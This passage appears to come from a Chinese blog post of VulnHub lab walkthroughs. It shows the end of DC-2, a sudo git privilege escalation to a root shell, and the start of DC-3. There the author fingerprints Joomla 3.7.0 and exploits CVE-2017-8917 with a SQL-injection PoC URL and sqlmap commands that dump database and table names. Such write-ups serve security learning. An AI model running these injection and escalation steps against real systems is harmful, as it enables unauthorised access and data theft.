</span></span></code></pre></div><p><code>find</code>没有找到suid权限文件，尝试<code>sudo -l</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>jerry@DC-2:~$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> jerry on DC-2:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User jerry may run the following commands on DC-2:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/git
</span></span></code></pre></div><p>git提权：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sudo git help config
</span></span><span style=display:flex><span>在命令模式的末行输入!/bin/bash或!<span style=color:#e6db74>&#39;sh&#39;</span>
</span></span></code></pre></div><p><code>final-flag.txt</code>：</p><pre tabindex=0><code># cat /root/final-flag.txt
 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| &#39;_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it&#39;s all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre><p>参考资料：</p><p><a href=https://www.ddosi.org/cewl/>https://www.ddosi.org/cewl/</a></p><p><a href=https://www.freebuf.com/vuls/376922.html>https://www.freebuf.com/vuls/376922.html</a></p><hr><h2 id=vulnhub-dc3>vulnhub DC3<a hidden class=anchor aria-hidden=true href=#vulnhub-dc3>#</a></h2><p>nmap扫描开放端口及服务：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nmap 61.139.2.0/24
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 61.139.2.136
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00096s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>999</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>80/tcp open  http
</span></span></code></pre></div><p>全面扫描：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nmap -A -p 1-65535 61.139.2.136
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2025-09-26 10:39 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 61.139.2.136
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00096s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65534</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.18 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-generator: Joomla! - Open Source Content Management
</span></span><span style=display:flex><span>|_http-title: Home
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.18 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>访问web服务：</p><p><img alt=alt loading=lazy src=/images/vulnhub/4.png></p><p>获取版本信息<code>/administrator/manifests/files/joomla.xml</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;extension</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;3.6&#34;</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;file&#34;</span> <span style=color:#a6e22e>method=</span><span style=color:#e6db74>&#34;upgrade&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;name&gt;</span>files_joomla<span style=color:#f92672>&lt;/name&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;author&gt;</span>Joomla! Project<span style=color:#f92672>&lt;/author&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;authorEmail&gt;</span>admin@joomla.org<span style=color:#f92672>&lt;/authorEmail&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;authorUrl&gt;</span>www.joomla.org<span style=color:#f92672>&lt;/authorUrl&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;copyright&gt;</span>
</span></span><span style=display:flex><span>(C) 2005 - 2017 Open Source Matters. All rights reserved
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/copyright&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;license&gt;</span>
</span></span><span style=display:flex><span>GNU General Public License version 2 or later; see LICENSE.txt
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/license&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;version&gt;</span>3.7.0<span style=color:#f92672>&lt;/version&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;creationDate&gt;</span>April 2017<span style=color:#f92672>&lt;/creationDate&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;description&gt;</span>FILES_JOOMLA_XML_DESCRIPTION<span style=color:#f92672>&lt;/description&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;scriptfile&gt;</span>administrator/components/com_admin/script.php<span style=color:#f92672>&lt;/scriptfile&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;update&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;schemas&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;schemapath</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;mysql&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>administrator/components/com_admin/sql/updates/mysql
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/schemapath&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;schemapath</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;sqlsrv&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>administrator/components/com_admin/sql/updates/sqlazure
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/schemapath&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;schemapath</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;sqlazure&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>administrator/components/com_admin/sql/updates/sqlazure
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/schemapath&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;schemapath</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;postgresql&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>administrator/components/com_admin/sql/updates/postgresql
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/schemapath&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/schemas&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/update&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;fileset&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;files&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>administrator<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>bin<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>cache<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>cli<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>components<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>images<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>includes<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>language<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>layouts<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>libraries<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>media<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>modules<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>plugins<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>templates<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;folder&gt;</span>tmp<span style=color:#f92672>&lt;/folder&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;file&gt;</span>htaccess.txt<span style=color:#f92672>&lt;/file&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;file&gt;</span>web.config.txt<span style=color:#f92672>&lt;/file&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;file&gt;</span>LICENSE.txt<span style=color:#f92672>&lt;/file&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;file&gt;</span>README.txt<span style=color:#f92672>&lt;/file&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;file&gt;</span>index.php<span style=color:#f92672>&lt;/file&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/files&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/fileset&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;updateservers&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;server</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;Joomla! Core&#34;</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;collection&#34;</span><span style=color:#f92672>&gt;</span>https://update.joomla.org/core/list.xml<span style=color:#f92672>&lt;/server&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/updateservers&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/extension&gt;</span>
</span></span></code></pre></div><p>Joomla 3.7.0 (CVE-2017-8917) 存在SQL注入漏洞，poc：</p><pre tabindex=0><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)
500 XPATH syntax error: &#39;&gt;root@localhost&#39; 
</code></pre><p>使用searchsploit查找漏洞利用方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ searchsploit joomla 3.7.0    
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
</span></span><span style=display:flex><span> Exploit Title                                                                                                          |  Path
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
</span></span><span style=display:flex><span>Joomla! 3.7.0 - <span style=color:#e6db74>&#39;com_fields&#39;</span> SQL Injection                                                                              | php/webapps/42033.txt
</span></span><span style=display:flex><span>Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting                                                           | php/webapps/43488.txt
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
</span></span><span style=display:flex><span>Shellcodes: No Results
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ cat /usr/share/exploitdb/exploits/php/webapps/42033.txt
</span></span><span style=display:flex><span><span style=color:#75715e># Exploit Title: Joomla 3.7.0 - Sql Injection</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Date: 05-19-2017</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Exploit Author: Mateus Lino</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Vendor Homepage: https://www.joomla.org/</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Version: = 3.7.0</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span>
</span></span><span style=display:flex><span><span style=color:#75715e># CVE : - CVE-2017-8917</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>URL Vulnerable: http://localhost/index.php?option<span style=color:#f92672>=</span>com_fields&amp;view<span style=color:#f92672>=</span>fields&amp;layout<span style=color:#f92672>=</span>modal&amp;list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]=</span>updatexml%27
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Using Sqlmap:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sqlmap -u <span style=color:#e6db74>&#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> --level<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> --random-agent --dbs -p list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Parameter: list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]</span> <span style=color:#f92672>(</span>GET<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Type: boolean-based blind
</span></span><span style=display:flex><span>    Title: Boolean-based blind - Parameter replace <span style=color:#f92672>(</span>DUAL<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Payload: option<span style=color:#f92672>=</span>com_fields&amp;view<span style=color:#f92672>=</span>fields&amp;layout<span style=color:#f92672>=</span>modal&amp;list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]=(</span>CASE WHEN <span style=color:#f92672>(</span>1573<span style=color:#f92672>=</span>1573<span style=color:#f92672>)</span> THEN <span style=color:#ae81ff>1573</span> ELSE 1573*<span style=color:#f92672>(</span>SELECT <span style=color:#ae81ff>1573</span> FROM DUAL UNION SELECT <span style=color:#ae81ff>9674</span> FROM DUAL<span style=color:#f92672>)</span> END<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Type: error-based
</span></span><span style=display:flex><span>    Title: MySQL &gt;<span style=color:#f92672>=</span> 5.0 error-based - Parameter replace <span style=color:#f92672>(</span>FLOOR<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Payload: option<span style=color:#f92672>=</span>com_fields&amp;view<span style=color:#f92672>=</span>fields&amp;layout<span style=color:#f92672>=</span>modal&amp;list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]=(</span>SELECT <span style=color:#ae81ff>6600</span> FROM<span style=color:#f92672>(</span>SELECT COUNT<span style=color:#f92672>(</span>*<span style=color:#f92672>)</span>,CONCAT<span style=color:#f92672>(</span>0x7171767071,<span style=color:#f92672>(</span>SELECT <span style=color:#f92672>(</span>ELT<span style=color:#f92672>(</span>6600<span style=color:#f92672>=</span>6600,1<span style=color:#f92672>)))</span>,0x716a707671,FLOOR<span style=color:#f92672>(</span>RAND<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>*2<span style=color:#f92672>))</span>x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x<span style=color:#f92672>)</span>a<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Type: AND/OR time-based blind
</span></span><span style=display:flex><span>    Title: MySQL &gt;<span style=color:#f92672>=</span> 5.0.12 time-based blind - Parameter replace <span style=color:#f92672>(</span>substraction<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Payload: option<span style=color:#f92672>=</span>com_fields&amp;view<span style=color:#f92672>=</span>fields&amp;layout<span style=color:#f92672>=</span>modal&amp;list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]=(</span>SELECT * FROM <span style=color:#f92672>(</span>SELECT<span style=color:#f92672>(</span>SLEEP<span style=color:#f92672>(</span>5<span style=color:#f92672>)))</span>GDiu<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>利用sqlmap自动注入：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ sqlmap -u <span style=color:#e6db74>&#34;http://61.139.2.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> --level<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> --random-agent --dbs -p list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sqlmap identified the following injection point<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> with a total of <span style=color:#ae81ff>4381</span> HTTP<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> requests:
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>Parameter: list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]</span> <span style=color:#f92672>(</span>GET<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Type: error-based
</span></span><span style=display:flex><span>    Title: MySQL &gt;<span style=color:#f92672>=</span> 5.1 error-based - Parameter replace <span style=color:#f92672>(</span>UPDATEXML<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Payload: option<span style=color:#f92672>=</span>com_fields&amp;view<span style=color:#f92672>=</span>fields&amp;layout<span style=color:#f92672>=</span>modal&amp;list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]=(</span>UPDATEXML<span style=color:#f92672>(</span>4878,CONCAT<span style=color:#f92672>(</span>0x2e,0x717a766b71,<span style=color:#f92672>(</span>SELECT <span style=color:#f92672>(</span>ELT<span style=color:#f92672>(</span>4878<span style=color:#f92672>=</span>4878,1<span style=color:#f92672>)))</span>,0x7171717871<span style=color:#f92672>)</span>,5669<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:05:03<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> the back-end DBMS is MySQL
</span></span><span style=display:flex><span>web server operating system: Linux Ubuntu 16.10 or 16.04 <span style=color:#f92672>(</span>yakkety or xenial<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>web application technology: Apache 2.4.18
</span></span><span style=display:flex><span>back-end DBMS: MySQL &gt;<span style=color:#f92672>=</span> 5.1
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:05:03<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetching database names
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:05:03<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;information_schema&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:05:03<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;joomladb&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:05:03<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;mysql&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:05:03<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;performance_schema&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>11:05:03<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;sys&#39;</span>
</span></span><span style=display:flex><span>available databases <span style=color:#f92672>[</span>5<span style=color:#f92672>]</span>:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> information_schema
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> joomladb
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> mysql
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> performance_schema
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> sys
</span></span></code></pre></div><p>获取<code>joomladb</code>下的表名：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ sqlmap -u <span style=color:#e6db74>&#34;http://61.139.2.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> --level<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> --random-agent -D <span style=color:#e6db74>&#34;joomladb&#34;</span> --tables -p list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Database: joomladb
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>76</span> tables<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+---------------------+
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__assets           |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__associations     |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__banner_clients   |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__banner_tracks    |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__banners          |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_admin       |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_books       |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_comments    |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_locations   |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_mediafiles  |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_message_typ |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_podcast     |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_series      |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_servers     |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_studies     |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_studytopics |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_teachers    |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_templatecod |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_templates   |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_timeset     |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_topics      |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__bsms_update      |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__categories       |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__contact_details  |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__content_frontpag |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__content_rating   |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__content_types    |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__content          |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__contentitem_tag_ |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__core_log_searche |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__extensions       |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__fields_categorie |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__fields_groups    |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__fields_values    |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__fields           |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__finder_filters   |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__finder_links_ter |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__finder_links     |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__finder_taxonomy_ |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__finder_taxonomy  |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__finder_terms_com |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__finder_terms     |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__finder_tokens_ag |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__finder_tokens    |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__finder_types     |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__jbsbackup_timese |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__jbspodcast_times |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__languages        |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__menu_types       |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__menu             |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__messages_cfg     |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__messages         |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__modules_menu     |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__modules          |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__newsfeeds        |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__overrider        |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__postinstall_mess |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__redirect_links   |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__schemas          |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__session          |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__tags             |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__template_styles  |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__ucm_base         |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__ucm_content      |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__ucm_history      |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__update_sites_ext |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__update_sites     |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__updates          |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__user_keys        |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__user_notes       |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__user_profiles    |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__user_usergroup_m |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__usergroups       |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__users            |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__utf8_conversion  |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__viewlevels       |</span>
</span></span><span style=display:flex><span>+---------------------+
